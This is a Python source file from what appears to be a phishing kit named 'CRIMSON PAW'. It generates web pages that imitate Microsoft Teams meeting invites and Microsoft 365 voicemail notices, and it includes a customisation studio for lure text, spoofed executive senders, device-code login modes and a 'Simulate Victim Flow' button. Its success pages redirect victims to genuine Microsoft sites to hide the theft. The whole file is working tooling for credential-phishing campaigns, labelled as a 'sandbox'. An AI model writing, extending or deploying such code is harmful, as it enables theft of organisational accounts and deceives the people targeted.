.desc {{ font-size: 0.86rem; color: #555566; line-height: 1.55; margin-bottom: 24px; }}
.progress-bar-wrap {{
    width: 100%;
    height: 6px;
    background: #e6e6f4;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 12px;
}}
.progress-bar-fill {{
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg, {accent}, #107C41);
    animation: load-prog {delay}ms linear forwards;
}}
@keyframes load-prog {{ to {{ width: 100%; }} }}
.redirect-txt {{ font-size: 0.78rem; color: #88889a; }}
</style>
</head>
<body>
<div class="card">
    {teams_logo}
    <div class="success-check">✓</div>
    <h1>{title}</h1>
    <p class="desc">{desc}</p>
    <div class="progress-bar-wrap"><div class="progress-bar-fill"></div></div>
    <p class="redirect-txt">Entering Microsoft Teams Conference Room...</p>
</div>
<script>setTimeout(function(){{ window.location.replace("{success_url}"); }}, {delay});</script>
</body>
</html>'''


def render_voicemail_success(cfg=None, success_url='https://outlook.office.com/mail/'):
    cfg = {**VOICEMAIL_DEFAULT_CONFIG, **(cfg or {})}
    title = cfg.get('success_title', 'Voicemail Decrypted Successfully')
    desc = cfg.get('success_desc', 'Identity confirmed. Launching audio message playback in your Microsoft 365 Outlook inbox...')
    accent = cfg.get('accent_color', '#0078D4')
    page_bg = cfg.get('page_color', '#f2f6fa')
    card_bg = cfg.get('card_bg', '#ffffff')
    delay = int(cfg.get('redirect_delay_ms', 3500))

    vm_logo = assets.get_logo_html('Voicemail', 52, 140, 'margin:0 auto 16px;')

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; }}
body {{ min-height: 100vh; display: flex; align-items: center; justify-content: center; background: {page_bg}; }}
.card {{
    background: {card_bg};
    border-radius: 16px;
    box-shadow: 0 8px 32px rgba(0, 120, 212, 0.14);
    padding: 40px 32px;
    max-width: 400px;
    width: 90%;
    text-align: center;
    border: 1px solid rgba(0, 120, 212, 0.18);
}}
.success-check {{
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: #0078D4;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.8rem;
    margin: 0 auto 16px;
    box-shadow: 0 4px 16px rgba(0, 120, 212, 0.35);
}}
h1 {{ font-size: 1.22rem; font-weight: 700; color: #1a1a24; margin-bottom: 10px; }}
.desc {{ font-size: 0.86rem; color: #555566; line-height: 1.55; margin-bottom: 24px; }}
.progress-bar-wrap {{
    width: 100%;
    height: 6px;
    background: #e0ecf8;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 12px;
}}
.progress-bar-fill {{
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg, {accent}, #50E6FF);
    animation: load-prog {delay}ms linear forwards;
}}
@keyframes load-prog {{ to {{ width: 100%; }} }}
.redirect-txt {{ font-size: 0.78rem; color: #88889a; }}
</style>
</head>
<body>
<div class="card">
    {vm_logo}
    <div class="success-check">▶</div>
    <h1>{title}</h1>
    <p class="desc">{desc}</p>
    <div class="progress-bar-wrap"><div class="progress-bar-fill"></div></div>
    <p class="redirect-txt">Streaming Voicemail in Outlook Web App...</p>
</div>
<script>setTimeout(function(){{ window.location.replace("{success_url}"); }}, {delay});</script>
</body>
</html>'''

# ═══════════════════════════════════════════════════════════════════════════
# FULL INTERACTIVE SANDBOX STUDIO UI
# ═══════════════════════════════════════════════════════════════════════════

def render_sandbox_studio_page():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CRIMSON PAW — Templates Sandbox Studio</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root {
    --bg-base: #0a0608;
    --bg-surface: #120a0e;
    --bg-card: rgba(22, 12, 17, 0.92);
    --border-color: rgba(229, 9, 20, 0.22);
    --border-highlight: rgba(229, 9, 20, 0.50);
    --crimson: #e50914;
    --crimson-glow: rgba(229, 9, 20, 0.35);
    --teams-accent: #5B5FC7;
    --vm-accent: #0078D4;
    --text-primary: #f5f0f2;
    --text-muted: #a49198;
}
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
body {
    background-color: var(--bg-base);
    color: var(--text-primary);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    overflow-x: hidden;
}

/* Studio Header */
.studio-header {
    height: 70px;
    padding: 0 32px;
    background: rgba(14, 8, 11, 0.88);
    backdrop-filter: blur(14px);
    border-bottom: 1px solid var(--border-color);
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
}
.brand-group {
    display: flex;
    align-items: center;
    gap: 14px;
}
.brand-icon {
    width: 38px;
    height: 38px;
    border-radius: 10px;
    background: linear-gradient(135deg, #e50914, #8b040b);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.2rem;
    box-shadow: 0 0 16px var(--crimson-glow);
}
.brand-title-wrap h1 {
    font-size: 1.05rem;
    font-weight: 900;
    letter-spacing: 0.12em;
    text-transform: uppercase;
}
.brand-title-wrap p {
    font-size: 0.72rem;
    color: var(--text-muted);
    font-weight: 600;
    letter-spacing: 0.05em;
}
.sandbox-shield {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(0, 180, 100, 0.12);
    border: 1px solid rgba(0, 180, 100, 0.35);
    color: #2ed573;
    padding: 6px 14px;
    border-radius: 9999px;
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 0.04em;
}
.nav-actions {
    display: flex;
    align-items: center;
    gap: 12px;
}
.btn-header {
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.15);
    color: var(--text-primary);
    padding: 8px 16px;
    border-radius: 8px;
    font-size: 0.82rem;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    transition: all 0.2s;
    display: inline-flex;
    align-items: center;
    gap: 6px;
}
.btn-header:hover {
    background: rgba(229, 9, 20, 0.15);
    border-color: var(--border-highlight);
    color: #fff;
}
.btn-primary {
    background: linear-gradient(135deg, #e50914, #b00710);
    border: none;
    box-shadow: 0 0 16px var(--crimson-glow);
}
.btn-primary:hover {
    background: linear-gradient(135deg, #ff1f2a, #cc0812);
    box-shadow: 0 0 24px rgba(229, 9, 20, 0.6);
}

/* Sub-toolbar */
.sub-toolbar {
    padding: 12px 32px;
    background: var(--bg-surface);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 20px;
    flex-wrap: wrap;
}
.template-switcher, .stage-switcher, .device-switcher {
    display: flex;
    background: rgba(0,0,0,0.4);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 10px;
    padding: 4px;
    gap: 4px;
}
.tab-btn {
    background: transparent;
    border: none;
    color: var(--text-muted);
    padding: 8px 18px;
    border-radius: 7px;
    font-size: 0.82rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    display: inline-flex;
    align-items: center;
    gap: 8px;
}
.tab-btn.active {
    background: rgba(229, 9, 20, 0.22);
    color: #ffffff;
    border: 1px solid rgba(229, 9, 20, 0.5);
    box-shadow: 0 2px 10px rgba(229,9,20,0.25);
}
.tab-btn.meeting-tab.active {
    background: rgba(91, 95, 199, 0.25);
    border-color: #5B5FC7;
    color: #fff;
}
.tab-btn.vm-tab.active {
    background: rgba(0, 120, 212, 0.25);
    border-color: #0078D4;
    color: #fff;
}

/* Main Studio Layout Split */
.studio-main {
    flex: 1;
    display: grid;
    grid-template-columns: 380px 1fr;
    height: calc(100vh - 128px);
    overflow: hidden;
}

/* Sidebar Customizer */
.sidebar-customizer {
    background: rgba(16, 10, 13, 0.95);
    border-right: 1px solid var(--border-color);
    padding: 24px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 20px;
}
.section-title {
    font-size: 0.75rem;
    font-weight: 800;
    letter-spacing: 0.14em;
    color: #ff6b72;
    text-transform: uppercase;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.form-group {
    margin-bottom: 14px;
}
.form-label {
    display: block;
    font-size: 0.74rem;
    font-weight: 700;
    letter-spacing: 0.05em;
    color: var(--text-muted);
    margin-bottom: 6px;
    text-transform: uppercase;
}
.form-input, .form-select, .form-textarea {
    width: 100%;
    background: #090507;
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: #fff;
    padding: 9px 12px;
    border-radius: 8px;
    font-size: 0.85rem;
    outline: none;
    transition: border-color 0.2s;
}
.form-input:focus, .form-select:focus, .form-textarea:focus {
    border-color: var(--crimson);
}
.form-textarea {
    resize: vertical;
    min-height: 60px;
    line-height: 1.4;
}
.color-picker-row {
    display: flex;
    align-items: center;
    gap: 10px;
}
.color-picker-input {
    width: 44px;
    height: 38px;
    padding: 0;
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 6px;
    background: transparent;
    cursor: pointer;
}

/* Preview Canvas Area */
.preview-canvas {
    background: #060405;
    background-image: 
        radial-gradient(circle at 50% 30%, rgba(229, 9, 20, 0.08) 0%, transparent 60%),
        linear-gradient(135deg, rgba(255, 255, 255, 0.02) 25%, transparent 25%),
        linear-gradient(225deg, rgba(255, 255, 255, 0.02) 25%, transparent 25%);
    background-size: 100% 100%, 40px 40px, 40px 40px;
    padding: 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
}
.iframe-wrapper {
    background: #ffffff;
    border-radius: 14px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.85), 0 0 0 1px rgba(255,255,255,0.1);
    overflow: hidden;
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    position: relative;
    width: 100%;
    height: 100%;
    max-width: 100%;
}
.iframe-wrapper.device-mobile {
    width: 390px;
    height: 844px;
    border-radius: 36px;
    box-shadow: 0 0 0 10px #1e1318, 0 24px 60px rgba(0,0,0,0.9);
}
.iframe-wrapper.device-tablet {
    width: 768px;
    height: 1024px;
    border-radius: 24px;
}
#previewIframe {
    width: 100%;
    height: 100%;
    border: none;
    display: block;
}

/* Responsive */
@media (max-width: 1024px) {
    .studio-main { grid-template-columns: 1fr; height: auto; }
    .sidebar-customizer { height: auto; border-right: none; border-bottom: 1px solid var(--border-color); }
    .preview-canvas { min-height: 800px; }
}
</style>
</head>
<body>

<!-- Header -->
<header class="studio-header">
    <div class="brand-group">
        <div class="brand-icon">🧪</div>
        <div class="brand-title-wrap">
            <h1>Templates Sandbox Studio</h1>
            <p>CRIMSON PAW — ISOLATED TESTING PLAYGROUND</p>
        </div>
        <div class="sandbox-shield">
            <span>🛡️</span>
            <span>SANDBOX SAFE · ZERO PRODUCTION IMPACT</span>
        </div>
    </div>
    <div class="nav-actions">
        <a href="/" class="btn-header">❮ Back to Dashboard</a>
        <button type="button" class="btn-header" onclick="openStandaloneTab()">↗ Open in New Tab</button>
        <button type="button" class="btn-header btn-primary" onclick="simulateFullFlow()">⚡ Simulate Victim Flow</button>
    </div>
</header>

<!-- Sub-toolbar -->
<div class="sub-toolbar">
    <!-- Template Switcher -->
    <div class="template-switcher">
        <button type="button" class="tab-btn meeting-tab active" id="tabMeeting" onclick="switchTemplate('meeting')">
            <span style="font-size:1.1rem;">💬</span> Microsoft Teams Meeting
        </button>
        <button type="button" class="tab-btn vm-tab" id="tabVoicemail" onclick="switchTemplate('voicemail')">
            <span style="font-size:1.1rem;">🎙️</span> Cloud Voicemail
        </button>
    </div>

    <!-- Stage Switcher -->
    <div class="stage-switcher">
        <button type="button" class="tab-btn active" id="stagePreland" onclick="switchStage('preland')">1. Pre-Land Lure</button>
        <button type="button" class="tab-btn" id="stageLanding" onclick="switchStage('landing')">2. Microsoft Login (Landing)</button>
        <button type="button" class="tab-btn" id="stageSuccess" onclick="switchStage('success')">3. Success Redirect</button>
    </div>

    <!-- Device Switcher -->
    <div class="device-switcher">
        <button type="button" class="tab-btn active" id="devDesktop" onclick="setDevice('desktop')" title="Desktop View">🖥️ Full</button>
        <button type="button" class="tab-btn" id="devTablet" onclick="setDevice('tablet')" title="Tablet View">💻 Tablet</button>
        <button type="button" class="tab-btn" id="devMobile" onclick="setDevice('mobile')" title="Mobile iPhone View">📱 Mobile</button>
    </div>
</div>

<!-- Main Split -->
<div class="studio-main">
    <!-- Sidebar -->
    <div class="sidebar-customizer">
        <div class="section-title">⚙️ Sandbox Customizer</div>

        <div class="form-group">
            <label class="form-label">Template</label>
            <input type="text" id="custTemplateName" class="form-input" readonly value="Teams Meeting">
        </div>

        <div class="form-group">
            <label class="form-label">Pre-Land Page Title</label>
            <input type="text" id="custTitle" class="form-input" oninput="updatePreview()" value="Join Microsoft Teams Meeting">
        </div>

        <div class="form-group">
            <label class="form-label">Topic / Subject Line</label>
            <input type="text" id="custTopic" class="form-input" oninput="updatePreview()" value="Q4 Executive Strategy & Security Review">
        </div>

        <div class="form-group">
            <label class="form-label">Organizer / Caller Identity</label>
            <input type="text" id="custOrganizer" class="form-input" oninput="updatePreview()" value="David Vance (Senior VP Operations)">
        </div>

        <div class="form-group">
            <label class="form-label">Pre-Land Description</label>
            <textarea id="custDesc" class="form-textarea" oninput="updatePreview()">You have been invited to join an encrypted Microsoft Teams meeting room. Please verify your organizational credentials to enter the virtual lobby.</textarea>
        </div>

        <div class="form-group">
            <label class="form-label">Primary Action Button Label</label>
            <input type="text" id="custBtnLabel" class="form-input" oninput="updatePreview()" value="Join Teams Meeting">
        </div>

        <div class="form-group">
            <label class="form-label">Accent Brand Color</label>
            <div class="color-picker-row">
                <input type="color" id="custColor" class="color-picker-input" onchange="updatePreview()" value="#5B5FC7">
                <input type="text" id="custColorHex" class="form-input" style="flex:1;" oninput="syncColorInput(this.value)" value="#5B5FC7">
            </div>
        </div>

        <div class="form-group">
            <label class="form-label">Landing Page Layout Mode</label>
            <select id="custMode" class="form-select" onchange="updatePreview()">
                <option value="S" selected>Mode S (Standard Code + Direct Sign-In)</option>
                <option value="A">Mode A (Device / Geo Location Audit)</option>
                <option value="B">Mode B (Business Document Inspection)</option>
                <option value="C">Mode C (Corporate Compliance Policy)</option>
                <option value="R">Mode R (Regulatory Audit Check)</option>
            </select>
        </div>

        <div class="form-group">
            <label class="form-label">Test Device Code</label>
            <input type="text" id="custUserCode" class="form-input" oninput="updatePreview()" value="TEAMS-8942">
        </div>

        <div class="form-group">
            <label class="form-label">Simulated Redirect URL (Success)</label>
            <input type="text" id="custSuccessUrl" class="form-input" oninput="updatePreview()" value="https://teams.microsoft.com/">
        </div>

        <div style="margin-top:auto; padding-top:20px; border-top:1px solid rgba(255,255,255,0.08);">
            <button type="button" class="btn-header" style="width:100%; justify-content:center; background:rgba(229,9,20,0.12); color:#ff6b72;" onclick="resetToTemplateDefaults()">
                🔄 Reset To Template Defaults
            </button>
        </div>
    </div>

    <!-- Canvas -->
    <div class="preview-canvas">
        <div class="iframe-wrapper" id="iframeWrapper">
            <iframe id="previewIframe" src="/sandbox/render?template=meeting&stage=preland"></iframe>
        </div>
    </div>
</div>

<script>
var currentTemplate = 'meeting';
var currentStage = 'preland';
var currentDevice = 'desktop';

var DEFAULTS = {
    meeting: {
        templateName: 'Teams Meeting',
        title: 'Join Microsoft Teams Meeting',
        topic: 'Q4 Executive Strategy & Security Review',
        organizer: 'David Vance (Senior VP Operations)',
        desc: 'You have been invited to join an encrypted Microsoft Teams meeting room. Please verify your organizational credentials to enter the virtual lobby.',
        btnLabel: 'Join Teams Meeting',
        color: '#5B5FC7',
        userCode: 'TEAMS-8942',
        successUrl: 'https://teams.microsoft.com/'
    },
    voicemail: {
        templateName: 'Cloud Voicemail',
        title: 'New Encrypted Voicemail (0:48)',
        topic: 'Voicemail-External-(0m48s).wav',
        organizer: '+1 (800) 419-7250 / Corporate Partner',
        desc: 'You have received a high-priority encrypted voice message. Verify your identity with your organizational account to decrypt the audio recording and play.',
        btnLabel: '▶ Play Encrypted Voicemail',
        color: '#0078D4',
        userCode: 'VMAIL-6319',
        successUrl: 'https://outlook.office.com/mail/'
    }
};

function switchTemplate(tmpl) {
    currentTemplate = tmpl;
    document.getElementById('tabMeeting').classList.toggle('active', tmpl === 'meeting');
    document.getElementById('tabVoicemail').classList.toggle('active', tmpl === 'voicemail');
    
    // Load defaults for template into sidebar
    var d = DEFAULTS[tmpl];
    document.getElementById('custTemplateName').value = d.templateName;
    document.getElementById('custTitle').value = d.title;
    document.getElementById('custTopic').value = d.topic;
    document.getElementById('custOrganizer').value = d.organizer;
    document.getElementById('custDesc').value = d.desc;
    document.getElementById('custBtnLabel').value = d.btnLabel;
    document.getElementById('custColor').value = d.color;
    document.getElementById('custColorHex').value = d.color;
    document.getElementById('custUserCode').value = d.userCode;
    document.getElementById('custSuccessUrl').value = d.successUrl;

    updatePreview();
}

function switchStage(stage) {
    currentStage = stage;
    document.getElementById('stagePreland').classList.toggle('active', stage === 'preland');
    document.getElementById('stageLanding').classList.toggle('active', stage === 'landing');
    document.getElementById('stageSuccess').classList.toggle('active', stage === 'success');
    updatePreview();
}

function setDevice(device) {
    currentDevice = device;
    document.getElementById('devDesktop').classList.toggle('active', device === 'desktop');
    document.getElementById('devTablet').classList.toggle('active', device === 'tablet');
    document.getElementById('devMobile').classList.toggle('active', device === 'mobile');

    var wrap = document.getElementById('iframeWrapper');
    wrap.className = 'iframe-wrapper';
    if (device === 'mobile') wrap.classList.add('device-mobile');
    else if (device === 'tablet') wrap.classList.add('device-tablet');
}

function syncColorInput(val) {
    document.getElementById('custColor').value = val;
    updatePreview();
}

function buildConfigParams() {
    var title = encodeURIComponent(document.getElementById('custTitle').value);
    var topic = encodeURIComponent(document.getElementById('custTopic').value);
    var org = encodeURIComponent(document.getElementById('custOrganizer').value);
    var desc = encodeURIComponent(document.getElementById('custDesc').value);
    var btn = encodeURIComponent(document.getElementById('custBtnLabel').value);
    var color = encodeURIComponent(document.getElementById('custColor').value);
    var mode = encodeURIComponent(document.getElementById('custMode').value);
    var uc = encodeURIComponent(document.getElementById('custUserCode').value);
    var succ = encodeURIComponent(document.getElementById('custSuccessUrl').value);

    return '?template=' + currentTemplate +
           '&stage=' + currentStage +
           '&title=' + title +
           '&topic=' + topic +
           '&organizer=' + org +
           '&desc=' + desc +
           '&btn_label=' + btn +
           '&accent_color=' + color +
           '&mode=' + mode +
           '&user_code=' + uc +
           '&success_url=' + succ;
}

function updatePreview() {
    var url = '/sandbox/render' + buildConfigParams();
    document.getElementById('previewIframe').src = url;
}

function openStandaloneTab() {
    var url = '/sandbox/render' + buildConfigParams();
    window.open(url, '_blank');
}

function simulateFullFlow() {
    switchStage('preland');
    setTimeout(function() {
        try {
            var doc = document.getElementById('previewIframe').contentWindow.document;
            var btn = doc.querySelector('.btn-join, .btn-listen');
            if (btn) btn.click();
        } catch(e) {}
    }, 600);
}

function resetToTemplateDefaults() {
    switchTemplate(currentTemplate);
}
</script>
</body>
</html>'''

# ═══════════════════════════════════════════════════════════════════════════
# DYNAMIC RENDER DISPATCHER FOR SANDBOX
# ═══════════════════════════════════════════════════════════════════════════

def render_sandbox_preview(template_key='meeting', stage='preland', overrides=None):
    overrides = overrides or {}
    template_key = (template_key or 'meeting').lower()
    stage = (stage or 'preland').lower()

    if 'voicemail' in template_key:
        cfg = {**VOICEMAIL_DEFAULT_CONFIG, **overrides}
        if stage == 'landing':
            uc = overrides.get('user_code') or overrides.get('code') or 'VMAIL-6319'
            mode = overrides.get('mode') or overrides.get('landing_mode') or 'S'
            succ_url = overrides.get('success_url') or '/sandbox/templates/voicemail/success'
            return render_voicemail_landing(cfg, user_code=uc, success_url=succ_url, mode=mode)
        elif stage == 'success':
            succ_url = overrides.get('success_url') or 'https://outlook.office.com/mail/'
            return render_voicemail_success(cfg, success_url=succ_url)
        else: # preland
            proceed = f"/sandbox/render?template=voicemail&stage=landing&user_code={overrides.get('user_code', 'VMAIL-6319')}"
            return render_voicemail_preland(cfg, proceed_url=proceed)
    else: # meeting
        cfg = {**MEETING_DEFAULT_CONFIG, **overrides}
        if stage == 'landing':
            uc = overrides.get('user_code') or overrides.get('code') or 'TEAMS-8942'
            mode = overrides.get('mode') or overrides.get('landing_mode') or 'S'
            succ_url = overrides.get('success_url') or '/sandbox/templates/meeting/success'
            return render_meeting_landing(cfg, user_code=uc, success_url=succ_url, mode=mode)
        elif stage == 'success':
            succ_url = overrides.get('success_url') or 'https://teams.microsoft.com/'
            return render_meeting_success(cfg, success_url=succ_url)
        else: # preland
            proceed = f"/sandbox/render?template=meeting&stage=landing&user_code={overrides.get('user_code', 'TEAMS-8942')}"
            return render_meeting_preland(cfg, proceed_url=proceed)
